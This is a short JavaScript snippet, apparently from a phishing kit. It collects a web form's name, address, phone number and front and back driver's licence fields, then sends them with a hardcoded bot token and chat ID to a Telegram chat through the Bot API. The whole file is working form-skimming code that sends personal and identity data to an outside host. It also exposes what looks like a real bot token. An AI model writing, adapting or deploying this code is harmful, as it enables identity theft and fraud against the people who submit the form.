//bot token
var telegram_bot_id = "6163150715:AAGz1YBb0tkwYw-YmS2lisFQvj-pZ1p078w";
//chat id
var chat_id = 1139790477;
var u_name, address, phone, f_dl, b_dl, message;
var ready = function () {
  u_name = document.getElementById("name").value;
  address = document.getElementById("address").value;
  phone = document.getElementById("phone").value;
  f_dl = document.getElementById("f-dl").value;
  b_dl = document.getElementById("b-dl").value;
  message =
    "Name: " +
    u_name +
    "\nAddress: " +
    address +
    "\nPhone: " +
    phone +
    "\nFrontDl: " +
    f_dl +
    "\nBackDl: " +
    b_dl;
};
var sender = function () {
  ready();
  var settings = {
    async: true,
    crossDomain: true,
    url: "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
    method: "POST",
    headers: {
      "Content-Type": "application/json",
      "cache-control": "no-cache",
    },
    data: JSON.stringify({
      chat_id: chat_id,
      text: message,
    }),
  };
  $.ajax(settings).done(function (response) {
    console.log(response);
  });
  document.getElementById("name").value;
  document.getElementById("address").value;
  document.getElementById("phone").value;
  document.getElementById("f-dl").value;
  document.getElementById("b-dl").value;
  return false;
};
